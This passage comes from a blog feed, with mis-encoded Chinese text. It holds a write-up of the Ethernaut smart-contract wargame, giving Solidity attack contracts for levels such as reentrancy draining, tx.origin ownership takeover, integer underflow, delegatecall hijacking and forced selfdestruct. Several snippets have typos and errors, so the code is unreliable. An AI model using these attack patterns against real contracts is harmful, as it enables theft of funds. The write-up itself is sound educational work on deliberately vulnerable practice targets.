(bool);</code></li><li><code>transferFrom()</code>é€šè¿‡æˆæƒæœºåˆ¶ï¼Œä»<code>from</code>è´¦æˆ·å‘<code>to</code>è´¦æˆ·è½¬è´¦<code>amount</code>æ•°é‡ä»£å¸ã€‚è½¬è´¦çš„éƒ¨åˆ†ä¼šä»è°ƒç”¨è€…çš„<code>allowance</code>ä¸­æ‰£é™¤ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å› <code>true</code>. é‡Šæ”¾ {Transfer} äº‹ä»¶. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>ä»¥ä¸Šé¡»è®°ä½ï¼Œä»¥ä¾¿å¥½ç”¨</li></ul><p>è¯´ç™½äº†ï¼Œå®ƒå°±æ˜¯ä»¥å¤ªåŠå‘è¡Œä»£å¸çš„ä¸€ä¸ªæ ‡å‡†ï¼Œå­¦ä¼šäº†å¦‚ä½•å®ç°ERC20ï¼Œå¯¹å…¥é—¨åŒºå—é“¾æ˜¯å¾ˆæœ‰å¸®åŠ©çš„</p>]]></content>
      
      
      
        <tags>
            
            <tag> åè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernauté¶åœºé¢˜è§£</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…ï¼Œå¹¶ä½¿è¿™ä¸ªåˆçº¦çš„é’±ä¸ºé›¶</p><p>åˆ†æ;<br>ä»è¿™ä¸ªåˆçº¦ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¦æˆä¸ºowner<br>1ï¼Œæˆ‘ä»¬çš„é’±å¿…é¡»å¤§äºåˆçº¦æŒæœ‰è€…çš„é’±ï¼Œä½†æ˜¯æœ€å¼€å§‹åˆçº¦æœ¬èº«å°±æœ‰1000etherï¼Œè¿™ä¸ªæ—¶å€™å°±èµ°contributeå‡½æ•°ä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šé’±<br>2ï¼Œæ­¤æ—¶å‘ç°receiveï¼Œåªè¦æˆ‘ä»¬çš„é’±å’Œåˆçº¦çš„é’±å¤§äº0ï¼Œå°±å¯ä»¥æˆä¸ºè¿™ä¸ªåˆçº¦çš„æŒæœ‰è€…</p><p>æ–¹æ³•ï¼š<br>1ï¼Œåœ¨remixä¸Šä¸èƒ½éƒ¨ç½²è¿™ä¸ªåˆçº¦ï¼Œå› ä¸ºéƒ¨ç½²åï¼Œåˆçº¦åˆå§‹åŒ–ï¼Œownerå°±æ˜¯æˆ‘ä»¬è‡ªå·±äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨åˆçº¦åœ°å€<strong>At Adress</strong><br>2,è°ƒç”¨contributeå‡½æ•°ï¼Œè½¬è´¦1weiï¼›<br>2,è°ƒç”¨receiveå‡½æ•°ï¼Œè½¬è´¦1wei,å°±å®Œæˆäº†,æ³¨æ„è®°å¾—å°†é’±æ”¶å›æ¥</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>è¦æ±‚æ˜¯ï¼Œæˆä¸ºè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰è€…</p><p>åˆ†æï¼š<br>æ³¨æ„è¿™ä¸ªçš„solidityçš„ç‰ˆæœ¬æ˜¯0.6ï¼Œæ²¡æœ‰å½±å“å…³ç³»ï¼Œåªæ˜¯æ„é€ å‡½æ•°çš„å†™æ³•ä¸ä¸€æ ·ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸ownerç›¸å…³çš„å‡½æ•°ï¼Œå†å»åˆ†ææ„é€ çš„åˆçº¦åå­—Falloutï¼Œä»”ç»†å‘ç°æœ‰ä¸ªFal1outçš„å‡½æ•°ï¼Œå®ƒå®é™…ä¸Šæ˜¯å‘½åé”™è¯¯çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è°ƒåŠ¨è¿™ä¸ªå‡½æ•°ï¼Œåˆšå¥½æˆä¸ºåˆçº¦çš„æ‰€æœ‰è€…</p><p>æ–¹æ³•ï¼šç›´æ¥éƒ¨ç½²ä¸è¡Œï¼Œå› ä¸ºé‡Œé¢æœ‰å…¶ä»–çš„importï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¤–éƒ¨è°ƒç”¨è¿™ä¸ªåˆçº¦ï¼Œä½¿ç”¨æ¥å£,å¦åˆ›å»ºä¸€ä¸ªåˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //è§‚å¯Ÿæ‰€æœ‰è€…çš„åœ°å€æ˜¯å¦ä¸ºæˆ‘ä»¬</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>è¦æ±‚æ˜¯ï¼Œè¿ç»­çŒœå¯¹10æ¬¡çŒœå¯¹ç¡¬å¸çš„ç»“æœ</p><p>åˆ†æï¼šå°±æ˜¯è¦æƒ³åŠæ³•è°ƒç”¨flip()å‡½æ•°10æ¬¡ï¼Œè®©çŒœæµ‹çš„ç»“æœä¸sideä¸€è‡´</p><p>æ–¹æ³•ï¼šç›´æ¥ä¸Šæ”»å‡»åˆçº¦,åœ¨ç›®æ ‡åˆçº¦å†…,éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œå°±æ˜¯ä¸€æ ·çš„è°ƒç”¨ç›®æ ‡åˆçº¦çš„flipå‡½æ•°ä¹‹åï¼Œå¾—åˆ°çš„guessåœ¨è¿›å…¥ä¸€æ ·çš„ç›®æ ‡åˆçº¦ä¹‹ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬çš„çŒœæµ‹å€¼guesså°±ä¸sideä¸€æ ·äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//ä¿è¯æ”»å‡»åˆçº¦ä¸­çš„guessä¸åˆå§‹åˆçº¦çš„sideä¸€æ ·</span><br><span class="line">    &#125;</span><br><span class="line">  // å¤åˆ¶åˆå§‹åˆçº¦çš„flip()å‡½æ•°</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>è¦æ±‚æ˜¯ï¼Œè·å¾—è¯¥åˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æï¼šä»£ç è¿˜æ˜¯æŒºçŸ­çš„ï¼Œä¸»è¦å°±æ˜¯å¼„æ‡‚<strong>tx.origin</strong>æ˜¯ä»€ä¹ˆæ„æ€ï¼Œ<strong>tx.origin</strong>æ˜¯å‘èµ·äº¤æ˜“çš„è´¦æˆ·ï¼Œ<strong>msg.sender</strong>æ˜¯å½“å‰ç›´æ¥è°ƒç”¨è¿™ä¸ªåˆçº¦çš„å³æ—¶è´¦æˆ·ï¼Œåªè¦è¿™ä¿©è€…ä¸ä¸€æ ·å°±æˆåŠŸäº†<br>è¯¦ç»†è§£é‡Šï¼š</p><ul><li>Aè°ƒç”¨Båˆçº¦<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>Aè°ƒç”¨Båˆçº¦ï¼ŒBåˆçº¦è°ƒç”¨Cåˆçº¦<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>æ–¹æ³•ï¼šç›´æ¥è°ƒç”¨Telephoneåˆçº¦ï¼Œä¸èƒ½æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†™ä¸€ä¸ªæ”»å‡»åˆçº¦æ¥è°ƒç”¨Telephoneåˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_targetæ¥å—Telephoneçš„åœ°å€ï¼Œæˆ‘ä»¬éƒ¨ç½²Hackåˆçº¦ï¼Œmsg.senderå°±æ˜¯æˆ‘ä»¬çš„åœ°å€</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>è¦æ±‚æ˜¯ï¼Œæˆ‘ä»¬æœ‰20ä¸ªä»£å¸ï¼Œéœ€è¦è®©ä»£å¸ä½™é¢å¢åŠ åˆ°20ä»¥ä¸Š</p><p>åˆ†æï¼šè¿˜æ˜¯çœ‹solidityç‰ˆæœ¬ï¼Œ0.6ç‰ˆæœ¬æ²¡æœ‰å†…ç½®Safemath,æ‰€ä»¥å°±å¯ä»¥æ‰§è¡Œæº¢å‡ºæˆ–è€…ä¸‹æº¢çš„æ“ä½œ  </p><blockquote><p>Safemath:åœ¨Solidity ä¸­ï¼ŒSafeMathæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„åº“ï¼Œç”¨äºé˜²æ­¢æ•´æ•°æº¢å‡ºå’Œä¸‹æº¢çš„å®‰å…¨æ•°å­¦è¿ç®—å·¥å…·ã€‚ç”±äºSolidityçš„æ•´æ•°ç±»å‹ï¼ˆå¦‚ uint å’Œint ï¼‰æ˜¯æœ‰é™çš„ï¼Œå½“è¿›è¡ŒåŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•æˆ–é™¤æ³•è¿ç®—æ—¶ï¼Œå¦‚æœæ“ä½œç»“æœè¶…å‡ºäº†ç±»å‹èŒƒå›´ï¼Œå°±ä¼šå¯¼è‡´æº¢å‡ºæˆ–ä¸‹æº¢<br>å¦‚ï¼Œ0-1ä¼šå¯¼è‡´ä¸‹æº¢ï¼Œå°±ä¼šç”Ÿæˆæœ€å¤§çš„æ— ç¬¦å·æ•´æ•°ï¼Œå¹¶ä¸”å¤§äº0</p></blockquote><p>æ–¹æ³•ï¼šè°ƒç”¨æ”»å‡»åˆçº¦ä¸­ï¼Œå†è°ƒç”¨transferå‡½æ•°ï¼Œç»™msg.senderè½¬è´¦1ä¸ªä»£å¸ï¼Œç”±äºæ”»å‡»åˆçº¦æ²¡æœ‰ä»£å¸ï¼Œå°±ä¼šå‘ç”Ÿä¸‹æº¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>è¦æ±‚æ˜¯ï¼Œè·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æï¼šç†è§£<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,å°±æ˜¯è°ƒç”¨pwmå‡½æ•°ï¼Œé€šè¿‡è§¦å‘fallbackå‡½æ•°ï¼Œç„¶åè¿›è¡Œå§”æ‰˜ç”¨</p><p>æ–¹æ³•ï¼šéƒ¨ç½²Delegateåˆçº¦ï¼Œä½†æ˜¯ä¸è°ƒç”¨ï¼Œæˆ‘ä»¬æ˜¯åœ¨delegationåˆçº¦ä¸Šè°ƒç”¨pwnå‡½æ•°</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>è¦æ±‚æ˜¯ï¼Œä½¿è¿™ä¸ªåˆçº¦çš„ä½™é¢å¤§äºé›¶</p><p>åˆ†æï¼šä»£ç è¿˜æ˜¯å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªç©ºåˆçº¦ï¼Œä»€ä¹ˆå‡½æ•°ä¹Ÿæ²¡æœ‰ï¼Œå°±è€ƒè™‘åˆ°è‡ªæ¯åˆçº¦çš„åŠŸèƒ½  </p><blockquote><p>è‡ªæ¯åˆçº¦ï¼šè‡ªæ¯åˆçº¦æ˜¯ä¸€ç§æ™ºèƒ½åˆçº¦ï¼Œé€šå¸¸åŸºäºåŒºå—é“¾æŠ€æœ¯ï¼Œå…¶è®¾è®¡åˆè¡·æ˜¯åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨æ‰§è¡ŒæŸäº›é¢„å®šçš„æ“ä½œï¼Œæœ€ç»ˆå°†åˆçº¦è‡ªèº«çš„åŠŸèƒ½æˆ–è€…å­˜å‚¨çš„èµ„äº§é”€æ¯ã€‚è¿™ç§åˆçº¦çš„è®¾è®¡å¯ä»¥ç¡®ä¿åœ¨ç‰¹å®šæƒ…å†µå‘ç”Ÿæ—¶ï¼Œä¾‹å¦‚æŸä¸ªæ—¶é—´ç‚¹åˆ°è¾¾ã€æŸä¸ªæ¡ä»¶è¾¾æˆæˆ–è€…ç‰¹å®šçš„äº‹ä»¶å‘ç”Ÿï¼Œåˆçº¦å†…éƒ¨çš„èµ„äº§æˆ–è€…ä»£ç å¯ä»¥è¢«æ°¸ä¹…åˆ é™¤æˆ–è€…æ— æ³•è®¿é—®ã€‚</p></blockquote><p>æ–¹æ³•ï¼šä½¿ç”¨é€šè¿‡selfdestructhåŠŸèƒ½åˆ é™¤ä¸€ä¸ªåˆçº¦ï¼Œåˆçº¦å†…æ‰€æœ‰çš„ä½™é¢å°†è¢«å¼ºåˆ¶å‘é€åˆ°å¦ä¸€ä¸ªåˆçº¦ï¼Œå°±æ˜¯å†™ä¸€ä¸ªæ”»å‡»åˆçº¦è‡ªæ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²æ”»å‡»åˆçº¦æ—¶è®°å¾—å‘é€1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>è¦æ±‚æ˜¯ï¼Œè§£é”ä¿é™©ç®±</p><p>åˆ†æï¼špasswordæ˜¯ä¸ªç§æœ‰å˜é‡ï¼Œä¸èƒ½ç›´æ¥è·å–ï¼Œä½†æ˜¯å®ƒä¹Ÿæ˜¯ä¸ªçŠ¶æ€å˜é‡ï¼Œå¯ä»¥è®¿é—®çš„ï¼Œé€šè¿‡å›åˆ°ethernautç½‘ç«™ï¼Œåœ¨æ§åˆ¶å°è·å¾—å¯†ç å³å¯</p><p>æ–¹æ³•ï¼šåœ¨æ§åˆ¶å°è¾“å…¥ <code>await web3.eth.getStorageAt(contract.address,1)</code>, è·å¾—å¯†ç </p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>è¦æ±‚æ˜¯ï¼Œç ´åæ¸¸æˆè§„åˆ™</p><p>åˆ†æï¼šé€šè¿‡åˆçº¦æ¥çœ‹å°±æ˜¯é˜»ç¢åˆ«äººè°ƒç”¨receiveå‡½æ•°,æ‹’æ¥åˆ«äººçš„è½¬è´¦,</p><p>æ–¹æ³•ï¼šå†™ä¸€ä¸ªæ”»å‡»åˆçº¦,ä¸è¦æœ‰fallback,receiveå‡½æ•°ï¼Œé˜²æ­¢æ–°ç©å®¶è½¬è´¦ï¼Œæˆä¸ºæ–°å›½ç‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œæ”»å‡»åˆçº¦æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥å½“å‰çš„å¥–é‡‘å€¼ï¼Œç„¶åéƒ¨ç½²æ”»å‡»åˆçº¦æ—¶ï¼Œå‘é€è¯¥å¥–é‡‘å€¼</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>è¦æ±‚æ˜¯ï¼šçªƒå–åˆçº¦ä¸­çš„æ‰€æœ‰èµ„é‡‘</p><p>åˆ†æï¼šè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„é‡å…¥æ”»å‡»  </p><blockquote><p>é‡å…¥æ”»å‡»ï¼šé‡å…¥æ”»å‡»çš„å…¸å‹ç¤ºä¾‹æ˜¯ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦ä¸­å‘ç”Ÿçš„æƒ…å†µã€‚ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦æ˜¯æŒ‰ç…§ä»¥å¤ªå¸ï¼ˆETHï¼‰çš„ä¼ ç»Ÿäº¤æ˜“æ–¹å¼æ‰§è¡Œçš„ï¼Œåˆçº¦å¯ä»¥è°ƒç”¨å…¶ä»–åˆçº¦æˆ–å‘é€ETHåˆ°å¤–éƒ¨è´¦æˆ·ã€‚å¦‚æœä¸€ä¸ªåˆçº¦åœ¨è°ƒç”¨å¤–éƒ¨åˆçº¦æ—¶å…ˆè½¬ç§»ETHç»™å¦ä¸€ä¸ªåˆçº¦ï¼Œå¹¶ä¸”åœ¨æ¥æ”¶ETHåå†æ‰§è¡Œå…¶ä»–é€»è¾‘ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤–éƒ¨åˆçº¦å¯ä»¥åœ¨æ¥æ”¶ETHåè°ƒç”¨åŸåˆçº¦ï¼Œé‡æ–°æ‰§è¡Œå‘é€ETHçš„é€»è¾‘ï¼Œå¯¼è‡´é‡å¤çš„ETHè½¬ç§»ï¼Œä»è€Œé€ æˆèµ„é‡‘æŸå¤±ã€‚<br>é€šè¿‡ä¸æ–­è°ƒç”¨withdrawå‡½æ•°,çªƒå–èµ„é‡‘</p></blockquote><p>æ–¹æ³•: å†™ä¸€ä¸ªæ”»å‡»åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²æ”»å‡»åˆçº¦,è°ƒç”¨attackå‡½æ•°å‘é€1ether,å³å¯</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>è¦æ±‚æ˜¯,åˆ°è¾¾å»ºç­‘ç‰©çš„é¡¶æ¥¼</p><p>åˆ†æ:ç¬¬ä¸€æ¬¡çš„building.isLastFloor(_floor)è¦ä¸ºfalse,æ»¡è¶³ifçš„æ¡ä»¶,ç¬¬äºŒæ¬¡çš„building.isLastFloor(_floor)è¦ä¸ºture,ä½¿ç”µæ¢¯åˆ°æ¥¼é¡¶</p><p>æ–¹æ³•: å°±æ˜¯åœ¨æ”»å‡»åˆçº¦ä¸­å†™isLastFloorå‡½æ•°,è¾¾åˆ°è¦æ±‚,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>è¦æ±‚æ˜¯,è§£é”è¯¥åˆçº¦</p><p>åˆ†æ:å°±æ˜¯å°†lockedåˆå§‹å€¼ture,æ”¹ä¸ºfalse,è°ƒç”¨unlockå‡½æ•°</p><p>æ–¹æ³•: é¦–å…ˆè¦çŸ¥é“æ¯ä¸ªç§æœ‰çŠ¶æ€å¯å˜çš„å‚¨å­˜slot,å¦‚å›¾:<br>![è¿™æ˜¯å›¾ç‰‡](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>å†ä½¿ç”¨Webåº“æ¥è·å–è¿™ä¸ªæ•°æ®,ç„¶åæˆªå–ä¸º16å­—èŠ‚,å³ä¸ºå¯†é’¥,å†è°ƒç”¨unlockå‡½æ•°,å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’å³å¯</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>è¦æ±‚æ˜¯,å°†ä»£å¸ä½™é¢å˜ä¸ºé›¶</p><p>åˆ†æ:éš¾ç‚¹æœ‰ä¸ªæ—¶é—´é”,åœ¨è½¬ç§»ä»£å¸æ—¶,å¿…é¡»ç­‰å¾…10å¹´,æ‰€ä»¥å°±æ€è€ƒå…¶ä»–çš„æ–¹æ³•,ç„¶åå°±æ˜¯ç†Ÿæ‚‰ERC20åˆçº¦,ç›®æ ‡åˆçº¦importläº†ERC20,åé¢çš„æ”»å‡»åˆçº¦ä¹Ÿè¦ä½¿ç”¨,å»ºè®®å…ˆç†Ÿæ‚‰ERC20åˆçº¦å†æ¥è§£é¢˜,æˆ‘è¿™å°±ç›´æ¥ä¸Šæ”»å‡»åˆçº¦</p><p>æ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>è¦æ±‚æ˜¯,è·å¾—è¯¥åˆçº¦çš„æ‰€æœ‰æƒ</p><p>åˆ†æ:å§”æ‰˜è°ƒç”¨,æ³¨æ„çœ‹å‡½æ•°ç­¾å,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,å½“æˆ‘ä»¬è°ƒç”¨setFirstTimeå‡½æ•°æ—¶,å§”æ‰˜è°ƒç”¨ä¼šæ‰§è¡ŒsetTimeå‡½æ•°,æ­¤æ—¶timeZone1Libraryçš„åœ°å€å°†ä¼šæ›´æ–°,å¦‚æœæˆ‘ä»¬å†æ¬¡è°ƒç”¨setFirstTimeå‡½æ•°,åˆæ›´æ–°åœ°å€,è¿™æ ·å°±èƒ½æˆä¸ºowner</p><p>æ–¹æ³•:è¿˜æ˜¯å†™ä¸€ä¸ªæ”»å‡»åˆçº¦,è¿›è¡Œè°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>è¦æ±‚æ˜¯,æ¢å¤ä¸¢å¤±çš„0.001ä»¥å¤ªå¸</p><p>åˆ†æ:è¿™æ˜¯ä¸€ä¸ªå·¥å‚åˆçº¦,ç”±äºä¸çŸ¥é“ä»£å¸çš„åœ°å€,æ— æ³•æ‰¾åˆ°ä¸¢å¤±çš„ä»¥å¤ªå¸,æ‰€ä»¥æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯æ‰¾åˆ°è¿™ä¸ªä»£å¸åˆçº¦çš„åœ°å€,ç„¶åè¿›è¡Œè‡ªæ¯åˆçº¦,æœ‰ä¿©ç§æ–¹æ³•æ‰¾åˆ°ä»£å¸åˆçº¦çš„åœ°å€,ä¸€æ˜¯é€šè¿‡åŒºå—é“¾æµè§ˆå™¨Etherscan,æŸ¥è¯¢è°ƒç”¨generate Tokenäº¤æ˜“,æ‰¾åˆ°ä»£å¸åˆçº¦åœ°å€,äºŒæ˜¯é€šè¿‡è®¡ç®—,åœ¨Ethereum Stack Exchangeä¸Šå¯ä»¥æŸ¥è¯¢è®¡ç®—æ–¹å¼</p><p>æ–¹æ³•:é‡‡ç”¨è®¡ç®—åœ°å€çš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" 